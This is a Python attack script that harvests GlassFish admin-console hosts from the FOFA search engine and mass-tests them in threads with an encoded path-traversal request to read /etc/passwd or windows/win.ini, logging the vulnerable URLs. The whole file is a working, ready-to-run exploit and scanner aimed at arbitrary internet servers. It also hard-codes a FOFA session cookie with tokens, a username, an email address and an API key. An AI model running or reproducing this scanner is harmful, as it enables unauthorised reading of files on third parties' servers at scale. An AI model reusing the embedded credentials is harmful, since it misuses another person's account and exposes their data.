"""
#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
import requests, base64,os
from lxml import etree
from threading import *


def For_POC(url):
    url = url.strip("/")
    verify_linux = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    verify_windows = "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini"
    try:
        data_linux = requests.get(url + verify_linux)
        data_windows = requests.get(url + verify_windows)
        # review_linux=data_linux.content.decode("utf-8")
        # review_windows=data_windows.content.decode("utf-8")
        print('Checking -> ' + url)
        if (data_linux.status_code == 200) or (data_windows.status_code == 200):
            vul_url = (" Linux : " + url + verify_linux + "\n") if (data_linux.status_code == 200) else (
                        " Windows : " + url + verify_windows + "\n")
            with open('vulerable_url.txt', 'a') as f:
                f.write(vul_url)
            print("= = = = = = \n[+] Linux : POC = " + url + verify_linux + "\n= = = = = = ") if (
                        data_linux.status_code == 200) else print(
                "= = = = = = \n[+] Windows : POC = " + url + verify_windows + "\n= = = = = = ")
    except:
        pass


def Req_For_Fofa(grammar, page):
    fofa_default_url = "https://fofa.info/result?qbase64={0}&page={1}&page_size=20"
    qb64 = base64.b64encode(grammar.encode("utf-8")).decode('utf-8')
    req_url = fofa_default_url.format(qb64, page)
    headers = {
        'cookie': 'refresh_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTUwNzY4LCJtaWQiOjEwMDA4ODQ5OSwidXNlcm5hbWUiOiJZaW5nSmFkZSIsImV4cCI6MTY0ODg5NjI4NSwiaXNzIjoicmVmcmVzaCJ9.kyEfuaCeVZ7BwouwLYAaDwIxLcx8hMCw5isa8kYHIeW6RkylD1ZuNUpvBl7wGT5oKpjjXci6ollhch_Anr5DUQ; befor_router=; isUpgrade=; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTUwNzY4LCJtaWQiOjEwMDA4ODQ5OSwidXNlcm5hbWUiOiJZaW5nSmFkZSIsImV4cCI6MTY0ODgxNTE1My4zMzQ2MjksImlzcyI6InJlZnJlc2gifQ.DrYxRHCSTWnkIGqW3zXEbSNqZfoyYby4aQIk4KnTUN88PegcRGiNBuAWIgHI1RDQWThS6vL8m6T-7RAQd3bfNg; user=%7B%22id%22%3A150768%2C%22mid%22%3A100088499%2C%22is_admin%22%3Afalse%2C%22username%22%3A%22YingJade%22%2C%22nickname%22%3A%22YingJade%22%2C%22email%22%3A%22995344146%40qq.com%22%2C%22avatar_medium%22%3A%22https%3A%2F%2Fthirdwx.qlogo.cn%2Fmmopen%2Fvi_32%2FNwSgIBo7iaibJNoEZ0dCiam29LB6uaWTXiaRibBousZ6hsvibf7rWGicOaDNTwfaQKMa1gSsjHYDlmHG4ibicH5w5jMujRg%2F132%22%2C%22avatar_thumb%22%3A%22https%3A%2F%2Fthirdwx.qlogo.cn%2Fmmopen%2Fvi_32%2FNwSgIBo7iaibJNoEZ0dCiam29LB6uaWTXiaRibBousZ6hsvibf7rWGicOaDNTwfaQKMa1gSsjHYDlmHG4ibicH5w5jMujRg%2F132%22%2C%22key%22%3A%22a3fb2dce53fd438e9f9f547cb49b21a3%22%2C%22rank_name%22%3A%22%E6%99%AE%E9%80%9A%E4%BC%9A%E5%91%98%22%2C%22rank_level%22%3A1%2C%22company_name%22%3A%22YingJade%22%2C%22coins%22%3A0%2C%22can_pay_coins%22%3A0%2C%22credits%22%3A23%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A0%7D; Hm_lvt_b5514a35664fd4ac6a893a1e56956c97=1648637057,1648728671,1648771950; Hm_lpvt_b5514a35664fd4ac6a893a1e56956c97=1648771950; _dd_s=logs=1&id=d01de9ca-9495-4e7a-8b84-af57d3541fda&created=1648771945839&expire=1648773768210'
    }
    try:
        result = requests.get(req_url, headers=headers, ).content
        html = etree.HTML(result)
        sip_url = html.xpath("//span[@class='aSpan']/a/@href")
        suspicious_url = '\n'.join(sip_url)  # 将列表元素换行排列
        with open('GlassFish_Url.txt', 'a+') as f:
            f.write(suspicious_url + '\n')
        print("[+] Page " + str(page) + " finished. < <")
    except Exception as e:
        print('[-] Page ' + str(page) + ' error!')
    return
def Amout_Of_Pages(grammar, page:int =1):
    fofa_default_url = "https://fofa.info/result?qbase64={0}&page={1}&page_size=20"
    qb64 = base64.b64encode(grammar.encode("utf-8")).decode('utf-8')
    req_url = fofa_default_url.format(qb64, page)
    headers = {
        'cookie': 'refresh_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTUwNzY4LCJtaWQiOjEwMDA4ODQ5OSwidXNlcm5hbWUiOiJZaW5nSmFkZSIsImV4cCI6MTY0ODg5NjI4NSwiaXNzIjoicmVmcmVzaCJ9.kyEfuaCeVZ7BwouwLYAaDwIxLcx8hMCw5isa8kYHIeW6RkylD1ZuNUpvBl7wGT5oKpjjXci6ollhch_Anr5DUQ; befor_router=; isUpgrade=; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTUwNzY4LCJtaWQiOjEwMDA4ODQ5OSwidXNlcm5hbWUiOiJZaW5nSmFkZSIsImV4cCI6MTY0ODgxNTE1My4zMzQ2MjksImlzcyI6InJlZnJlc2gifQ.DrYxRHCSTWnkIGqW3zXEbSNqZfoyYby4aQIk4KnTUN88PegcRGiNBuAWIgHI1RDQWThS6vL8m6T-7RAQd3bfNg; user=%7B%22id%22%3A150768%2C%22mid%22%3A100088499%2C%22is_admin%22%3Afalse%2C%22username%22%3A%22YingJade%22%2C%22nickname%22%3A%22YingJade%22%2C%22email%22%3A%22995344146%40qq.com%22%2C%22avatar_medium%22%3A%22https%3A%2F%2Fthirdwx.qlogo.cn%2Fmmopen%2Fvi_32%2FNwSgIBo7iaibJNoEZ0dCiam29LB6uaWTXiaRibBousZ6hsvibf7rWGicOaDNTwfaQKMa1gSsjHYDlmHG4ibicH5w5jMujRg%2F132%22%2C%22avatar_thumb%22%3A%22https%3A%2F%2Fthirdwx.qlogo.cn%2Fmmopen%2Fvi_32%2FNwSgIBo7iaibJNoEZ0dCiam29LB6uaWTXiaRibBousZ6hsvibf7rWGicOaDNTwfaQKMa1gSsjHYDlmHG4ibicH5w5jMujRg%2F132%22%2C%22key%22%3A%22a3fb2dce53fd438e9f9f547cb49b21a3%22%2C%22rank_name%22%3A%22%E6%99%AE%E9%80%9A%E4%BC%9A%E5%91%98%22%2C%22rank_level%22%3A1%2C%22company_name%22%3A%22YingJade%22%2C%22coins%22%3A0%2C%22can_pay_coins%22%3A0%2C%22credits%22%3A23%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A0%7D; Hm_lvt_b5514a35664fd4ac6a893a1e56956c97=1648637057,1648728671,1648771950; Hm_lpvt_b5514a35664fd4ac6a893a1e56956c97=1648771950; _dd_s=logs=1&id=d01de9ca-9495-4e7a-8b84-af57d3541fda&created=1648771945839&expire=1648773768210'
    }
    try:
        result = requests.get(req_url, headers=headers, ).content
        html = etree.HTML(result)
        page_amount = int(html.xpath("//ul[@class='el-pager']/li[last()]/text()")[0])
    except Exception as e:
        print('[!] 请求失败！')
    return page_amount

def clearBlankLine(file_prefix):
    file_be= open(file_prefix+'.txt', 'r', encoding='utf-8') # 要去掉空行的文件
    file_af = open(file_prefix+'_For_Test.txt', 'w', encoding='utf-8') # 生成没有空行的文件
    try:
        for line in file_be.readlines():
            if line == '\n':
                line = line.strip("\n")
            file_af.write(line)
    finally:
        file_be.close()
        file_af.close()
        os.remove(file_prefix+'.txt')

if __name__ == '__main__':
    search_data = '"glassfish" && port="4848"'
    page_amount = Amout_Of_Pages(search_data)
    for pg in range(1,page_amount+1):
        RFF = Thread(target=Req_For_Fofa,args=(search_data,pg))
        RFF.start()
    clearBlankLine('GlassFish_Url')
    T=[]
    with open('GlassFish_Url_For_Test.txt','r') as f:
        for url in f.readlines():
            POC=Thread(target=For_POC,args=(url,))
            T.append(POC)
            POC.start()

    for t in T:
        t.join()
    clearBlankLine('vulerable_url')